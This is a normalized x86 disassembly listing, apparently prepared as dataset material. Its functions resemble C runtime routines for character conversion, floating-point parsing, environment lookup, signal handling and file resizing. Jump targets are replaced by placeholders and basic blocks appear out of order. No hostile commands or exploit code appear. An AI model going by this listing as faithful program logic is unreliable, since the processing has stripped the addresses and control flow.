cmp eax 0x41
jl r-xdata
push [ esp + 0x10 ]
call sub_414c8a
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_40e83e
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x5a
jg r-xdata
push esi
call edi
push 0x13
call sub_40e89f
pop ecx
jmp r-xdata
add eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_414c8a
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_412a7a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_414d55
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_414d9e
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_415634
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_415634
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_414df4
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_414d55
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_414d9e
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_414e80
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_414ea7
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_414ec2
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_414f4f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_414e80
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_414df4
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_414ea7
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_414e9b
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_414e9b
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_414e80
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_414ec2
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_414df4
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_414ec2
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_414ec2
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_414e9b
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_414ec2
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_4150e7
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4157d5
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4150bb
add esp 0x24
leave
retn
sub_415114
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4157d5
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_4150d1
add esp 0x24
leave
retn
sub_415141
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_412760
inc eax
push eax
push edi
push esi
call sub_40d490
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_4151b8
push ebp
mov ebp esp
sub esp 0x28
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_415214
pop ecx
lea eax [ ebp - 0x28 ]
pop ecx
lea esi [ ebp - 0xc ]
push eax
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_415ca6
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
movsx eax [ ebp - 0x26 ]
mov [ esi ] eax
movsx eax [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_412670
add esp 0x20
mov [ esi + 0xc ] edi
mov eax esi
pop edi
pop esi
leave
retn
sub_415214
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4152d3
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_412760
pop ecx
mov edi eax
call sub_415f78
test eax eax
jne r-xdata
push eax
call sub_412760
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_415f39
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_415350
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_40fcc3
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_4154d2
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
push ebx
call sub_40e89f
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_40c7f5
push 0x1
call sub_40e89f
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_40e89f
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_40e83e
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_4154d2
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_41550f
push ebp
mov ebp esp
mov eax 0x1004
call sub_40c4f0
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_413d5c
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_413d5c
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_40cc70
push 0x8000
push [ ebp + 0x8 ]
call sub_4160f1
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_413d5c
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413d5c
push [ ebp + 0x8 ]
call sub_41419d
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_411a4d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_40e7ac
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_40e7b5
mov [ eax ] edi
call sub_40e7b5
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_40e7ac
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4160f1
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_415634
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_415655
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_415634
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_415634
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_415634
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_415634
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_4156b3
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_4156e1
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_41570e
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_4156b3
push ebx
call sub_4156b3
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_415655
push ebx
call sub_4156b3
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_415655
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_4156b3
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_4157d5
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_415c76 ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_410aa5
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_410aa5
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_410aa5
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_41570e
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
